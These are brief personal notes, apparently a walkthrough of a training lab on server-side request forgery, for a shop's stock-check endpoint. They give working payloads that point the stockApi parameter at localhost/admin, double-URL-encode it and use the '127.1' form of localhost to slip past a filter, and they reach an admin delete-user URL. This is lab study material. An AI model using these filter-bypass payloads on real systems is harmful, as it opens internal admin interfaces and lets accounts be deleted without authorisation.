
[...back](../note.md)

# 1 endpoint and 2-urlencode for evasion

endpoint
```http
POST /product/stock HTTP/2
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

change to
```http
stockApi=http%3A%2F%2Fpayload

payload = localhost/admin
```

need 2-urlencode
```
localhost/admin = %6c%6f%63%61%6c%68%6f%73%74%2f%61%64%6d%69%6e
```

---

# 2 mechanics

what it does...
`POST /product/stock` + `stockApi=http://payload`

effectively `GET http://payload` and parse it back to the current product page

using `payload = localhost/admin` will reveal `GET /` (whole page) + `Admin Panel` authz with `<a href="/admin">`

expectation = inside `/admin` there is `delete` api taking parameter `username=carlos`

how to craft `payload` that can continue to access `/admin` and not stuck at `GET /`

---

# 3 localhost = 127.1 flaw

set `localhost = 127.1`

this now reveals `/admin/delete?username=carlos`

---

# end
